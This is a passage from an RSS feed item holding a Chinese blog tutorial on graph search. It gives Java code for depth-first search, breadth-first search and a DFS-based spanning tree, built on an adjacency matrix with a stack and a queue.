-&lt;p&gt;　　对于上面的图，应用广度优先搜索：以A为起始点，首先访问所有与 A 相邻的顶点，并在访问的同时将其插入队列中，现在已经访问了 A,B,C,D和E。这时队列（从头到尾）包含 BCDE，已经没有未访问的且与顶点 A 邻接的顶点了，所以从队列中取出B，寻找与B邻接的顶点，这时找到F，所以把F插入到队列中。已经没有未访问且与B邻接的顶点了，所以从队列列头取出C，它没有未访问的邻接点。因此取出 D 并访问 G，D也没有未访问的邻接点了，所以取出E，现在队列中有 FG，在取出 F，访问 H，然后取出 G，访问 I，现在队列中有 HI，当取出他们时，发现没有其它为访问的顶点了，这时队列为空，搜索结束。&lt;/p&gt;
-&lt;h4&gt;　　③、程序实现&lt;/h4&gt;
-&lt;p&gt;　　实现深度优先搜索的栈 StackX.class&lt;/p&gt;
-&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
-&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
-package com.ys.graph;
-
-public class StackX {
-        private final int SIZE = 20;
-        private int[] st;
-        private int top;
-        
-        public StackX(){
-                st = new int[SIZE];
-                top = -1;
-        }
-        
-        public void push(int j){
-                st[++top] = j;
-        }
-        
-        public int pop(){
-                return st[top--];
-        }
-        
-        public int peek(){
-                return st[top];
-        }
-        
-        public boolean isEmpty(){
-                return (top == -1);
-        }
-
-}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　实现广度优先搜索的队列Queue.class&lt;/p&gt;
-&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
-&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
-package com.ys.graph;
-
-public class Queue {
-        private final int SIZE = 20;
-        private int[] queArray;
-        private int front;
-        private int rear;
-        
-        public Queue(){
-                queArray = new int[SIZE];
-                front = 0;
-                rear = -1;
-        }
-        
-        public void insert(int j) {
-                if(rear == SIZE-1) {
-                        rear = -1;
-                }
-                queArray[++rear] = j;
-        }
-        
-        public int remove()     {
-                int temp = queArray[front++];
-                if(front == SIZE) {
-                        front = 0;
-                }
-                return temp;
-        }
-        
-        public boolean isEmpty() {
-                return (rear+1 == front || front+SIZE-1 == rear);
-        }
-}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　图代码 Graph.class&lt;/p&gt;
-&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;41&quot;&gt;
-&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
-package com.ys.graph;
-
-public class Graph {
-        private final int MAX_VERTS = 20;//表示顶点的个数
-        private Vertex vertexList[];//用来存储顶点的数组
-        private int adjMat[][];//用邻接矩阵来存储 边,数组元素0表示没有边界，1表示有边界
-        private int nVerts;//顶点个数
-        private StackX theStack;//用栈实现深度优先搜索
-        private Queue queue;//用队列实现广度优先搜索
-        /**
-         * 顶点类
-         * @author vae
-         */
-        class Vertex {
-                public char label;
-                public boolean wasVisited;
-                
-                public Vertex(char label){
-                        this.label = label;
-                        wasVisited = false;
-                }
-        }
-        
-        public Graph(){
-                vertexList = new Vertex[MAX_VERTS];
-                adjMat = new int[MAX_VERTS][MAX_VERTS];
-                nVerts = 0;//初始化顶点个数为0
-                //初始化邻接矩阵所有元素都为0，即所有顶点都没有边
-                for(int i = 0; i &amp;lt; MAX_VERTS; i++) {
-                        for(int j = 0; j &amp;lt; MAX_VERTS; j++) {
-                                adjMat[i][j] = 0;
-                        }
-                }
-                theStack = new StackX();
-                queue = new Queue();
-        }
-        
-        //将顶点添加到数组中，是否访问标志置为wasVisited=false(未访问)
-        public void addVertex(char lab) {
-                vertexList[nVerts++] = new Vertex(lab);
-        }
-        
-        //注意用邻接矩阵表示边，是对称的，两部分都要赋值
-        public void addEdge(int start, int end) {
-                adjMat[start][end] = 1;
-                adjMat[end][start] = 1;
-        }
-        
-        //打印某个顶点表示的值
-        public void displayVertex(int v) {
-                System.out.print(vertexList[v].label);
-        }
-        /**深度优先搜索算法:
-         * 1、用peek()方法检查栈顶的顶点
-         * 2、用getAdjUnvisitedVertex()方法找到当前栈顶点邻接且未被访问的顶点
-         * 3、第二步方法返回值不等于-1则找到下一个未访问的邻接顶点，访问这个顶点，并入栈
-         *        如果第二步方法返回值等于 -1，则没有找到，出栈
-         */
-        public void depthFirstSearch() {
-                //从第一个顶点开始访问
-                vertexList[0].wasVisited = true; //访问之后标记为true
-                displayVertex(0);//打印访问的第一个顶点
-                theStack.push(0);//将第一个顶点放入栈中
-                
-                while(!theStack.isEmpty()) {
-                        //找到栈当前顶点邻接且未被访问的顶点
-                        int v = getAdjUnvisitedVertex(theStack.peek());
-                        if(v == -1) {   //如果当前顶点值为-1，则表示没有邻接且未被访问顶点，那么出栈顶点
-                                theStack.pop();
-                        }else { //否则访问下一个邻接顶点
-                                vertexList[v].wasVisited = true;
-                                displayVertex(v);
-                                theStack.push(v);
-                        }
-                }
-                
-                //栈访问完毕，重置所有标记位wasVisited=false
-                for(int i = 0; i &amp;lt; nVerts; i++) {
-                        vertexList[i].wasVisited = false;
-                }
-        }
-        
-        //找到与某一顶点邻接且未被访问的顶点
-        public int getAdjUnvisitedVertex(int v) {
-                for(int i = 0; i &amp;lt; nVerts; i++) {
-                        //v顶点与i顶点相邻（邻接矩阵值为1）且未被访问 wasVisited==false
-                        if(adjMat[v][i] == 1 &amp;amp;&amp;amp; vertexList[i].wasVisited == false) {
-                                return i;
-                        }
-                }
-                return -1;
-        }
-        
-        /**
-         * 广度优先搜索算法：
-         * 1、用remove()方法检查栈顶的顶点
-         * 2、试图找到这个顶点还未访问的邻节点
-         * 3、 如果没有找到，该顶点出列
-         * 4、 如果找到这样的顶点，访问这个顶点，并把它放入队列中
-         */
-        public void breadthFirstSearch(){
-                vertexList[0].wasVisited = true;
-                displayVertex(0);
-                queue.insert(0);
-                int v2;
-                
-                while(!queue.isEmpty()) {
-                        int v1 = queue.remove();
-                        while((v2 = getAdjUnvisitedVertex(v1)) != -1) {
-                                vertexList[v2].wasVisited = true;
-                                displayVertex(v2);
-                                queue.insert(v2);
-                        }
-                }
-                
-                //搜索完毕，初始化，以便于下次搜索
-                for(int i = 0; i &amp;lt; nVerts; i++) {
-                        vertexList[i].wasVisited = false;
-                }
-        }
-        
-        public static void main(String[] args) {
-                Graph graph = new Graph();
-                graph.addVertex('A');
-                graph.addVertex('B');
-                graph.addVertex('C');
-                graph.addVertex('D');
-                graph.addVertex('E');
-                
-                graph.addEdge(0, 1);//AB
-                graph.addEdge(1, 2);//BC
-                graph.addEdge(0, 3);//AD
-                graph.addEdge(3, 4);//DE
-                
-                System.out.println(&quot;深度优先搜索算法 :&quot;);
-                graph.depthFirstSearch();//ABCDE
-                
-                System.out.println();
-                System.out.println(&quot;----------------------&quot;);
-                
-                System.out.println(&quot;广度优先搜索算法 :&quot;);
-                graph.breadthFirstSearch();//ABDCE
-        }
-}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;p&gt;　　测试结果：&lt;/p&gt;
-&lt;p&gt;　　&lt;img src=&quot;https://images2017.cnblogs.com/blog/1120165/201802/1120165-20180210123821185-1975637828.png&quot; alt=&quot;&quot;/&gt;&lt;/p&gt;
-&lt;h3&gt;4、最小生成树&lt;/h3&gt;
-&lt;p&gt; 　　对于图的操作，还有一个最常用的就是找到最小生成树，最小生成树就是用最少的边连接所有顶点。对于给定的一组顶点，可能有很多种最小生成树，但是最小生成树的边的数量 E 总是比顶点 V 的数量小1，即：&lt;/p&gt;
-&lt;p&gt;　　V = E + 1&lt;/p&gt;
-&lt;p&gt;　　这里不用关心边的长度，不是找最短的路径（会在带权图中讲解），而是找最少数量的边，可以基于深度优先搜索和广度优先搜索来实现。&lt;/p&gt;
-&lt;p&gt;　　比如基于深度优先搜索，我们记录走过的边，就可以创建一个最小生成树。因为DFS 访问所有顶点，但只访问一次，它绝对不会两次访问同一个顶点，但她看到某条边将到达一个已访问的顶点，它就不会走这条边，它从来不遍历那些不可能的边，因此，DFS 算法走过整个图的路径必定是最小生成树。&lt;/p&gt;
-&lt;div class=&quot;cnblogs_Highlighter&quot; readability=&quot;35&quot;&gt;
-&lt;pre class=&quot;brush:java;collapse:true;;gutter:true;&quot;&gt;
-//基于深度优先搜索找到最小生成树
-public void mst(){
-        vertexList[0].wasVisited = true;
-        theStack.push(0);
-        
-        while(!theStack.isEmpty()){
-                int currentVertex = theStack.peek();
-                int v = getAdjUnvisitedVertex(currentVertex);
-                if(v == -1){
-                        theStack.pop();
-                }else{
-                        vertexList[v].wasVisited = true;
-                        theStack.push(v);
-                        
-                        displayVertex(currentVertex);
-                        displayVertex(v);
-                        System.out.print(&quot; &quot;);
-                }
-        }
-        
-        //搜索完毕，初始化，以便于下次搜索
-        for(int i = 0; i &amp;lt; nVerts; i++) {
-                vertexList[i].wasVisited = false;
-        }
-}
-&lt;/pre&gt;&lt;/div&gt;
-&lt;h3&gt;5、总结&lt;/h3&gt;
-&lt;p&gt;　　图是由边连接的顶点组成，图可以表示许多真实的世界情况，包括飞机航线、电子线路等等。搜索算法以一种系统的方式访问图中的每个顶点，主要通过深度优先搜索（DFS）和广度优先搜索（BFS），深度优先搜索通过栈来实现，广度优先搜索通过队列来实现。最后需要知道最小生成树是包含连接图中所有顶点所需要的最少数量的边。&lt;/p&gt;
-
-</description>
-<pubDate>Wed, 14 Feb 2018 09:56:00 +0000</pubDate>
-<dc:creator>YSOcean</dc:creator>
-<dc:language>zh-cn</dc:language>
-<dc:format>text/html</dc:format>
-<dc:identifier>http://www.cnblogs.com/ysocean/p/8032659.html</dc:identifier>
 </item>
 </channel>
 </rss>
